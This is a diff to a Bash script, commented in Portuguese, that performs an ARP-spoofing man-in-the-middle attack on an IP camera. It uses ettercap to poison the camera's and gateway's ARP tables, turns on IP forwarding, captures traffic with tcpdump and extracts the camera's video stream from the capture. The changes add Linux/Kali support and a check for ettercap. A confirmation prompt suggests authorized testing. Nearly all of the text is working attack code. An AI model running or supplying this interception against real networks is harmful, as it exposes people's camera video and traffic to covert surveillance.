@@ -20,6 +20,7 @@ DURATION="${4:-120}"
 OUTDIR="${5:-mitm_run}"
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+UTILS_DIR="$(cd "$SCRIPT_DIR/../utils" && pwd)"
 PCAP="${OUTDIR}/capture.pcap"
 
 # ---- validações ----
@@ -50,8 +51,16 @@ read -r -p " Digitar 'SIM' para continuar: " CONFIRM
 
 mkdir -p "$OUTDIR"
 
-# ---- estado original do IP forwarding, para restaurar no fim ----
-ORIG_FWD="$(sysctl -n net.inet.ip.forwarding)"
+# ---- IP forwarding: Linux (Kali) vs macOS ----
+if [[ -f /proc/sys/net/ipv4/ip_forward ]]; then
+  FWD_SYSCTL="net.ipv4.ip_forward"
+elif [[ -f /proc/sys/net/inet/ip/forwarding ]] || sysctl net.inet.ip.forwarding >/dev/null 2>&1; then
+  FWD_SYSCTL="net.inet.ip.forwarding"
+else
+  echo "[!] não achei o sysctl de IP forwarding (Linux ou macOS?)." >&2
+  exit 1
+fi
+ORIG_FWD="$(sysctl -n "$FWD_SYSCTL")"
 
 ETTERCAP_PID=""
 TCPDUMP_PID=""
@@ -64,17 +73,23 @@ cleanup() {
   [[ -n "$ETTERCAP_PID" ]] && kill -INT "$ETTERCAP_PID" 2>/dev/null || true
   sleep 3
   # restaura IP forwarding ao valor original
-  sysctl -w net.inet.ip.forwarding="$ORIG_FWD" >/dev/null
+  sysctl -w "$FWD_SYSCTL=$ORIG_FWD" >/dev/null 2>&1
   echo "[*] IP forwarding restaurado para $ORIG_FWD. ARP tables normalizam sozinhas."
 }
 trap cleanup EXIT INT TERM
 
 # ---- 1. liga IP forwarding (senão a vítima perde conexão) ----
-echo "[1/4] a ligar IP forwarding..."
-sysctl -w net.inet.ip.forwarding=1 >/dev/null
+echo "[1/4] a ligar IP forwarding ($FWD_SYSCTL)..."
+sysctl -w "$FWD_SYSCTL=1" >/dev/null
 
 # ---- 2. ARP spoof em background ----
 echo "[2/4] a iniciar ARP spoof (ettercap)..."
+ETTERCAP="$(command -v ettercap || true)"
+if [[ -z "$ETTERCAP" ]]; then
+  echo "[!] ettercap não está no PATH — a captura numa rede switchada não vai ver o tráfego da câmera." >&2
+  echo "    (apt install ettercap-text-only, ou use bettercap.)" >&2
+  exit 1
+fi
 ettercap -T -q -i "$IFACE" -M arp:remote "/$CAM_IP//" "/$GW_IP//" \
   >"$OUTDIR/ettercap.log" 2>&1 &
 ETTERCAP_PID=$!
@@ -111,7 +126,7 @@ if [[ ! -s "$PCAP" ]]; then
 fi
 
 # O extractor assume a câmera como origem do stream; passamos o IP dela.
-python3 "$SCRIPT_DIR/extract_mitm_video.py" "$PCAP" --out "$OUTDIR" --cam-ip "$CAM_IP" || {
+python3 "$SCRIPT_DIR/../utils/extract_mitm_video.py" "$PCAP" --out "$OUTDIR" --cam-ip "$CAM_IP" || {
   echo "[i] Sem frames de vídeo no pcap."
   echo "    Em STA a câmera só emite vídeo quando o app abre o viewer."
   echo "    Control channel + MQTT continuam no pcap: $PCAP (abrir no Wireshark)."
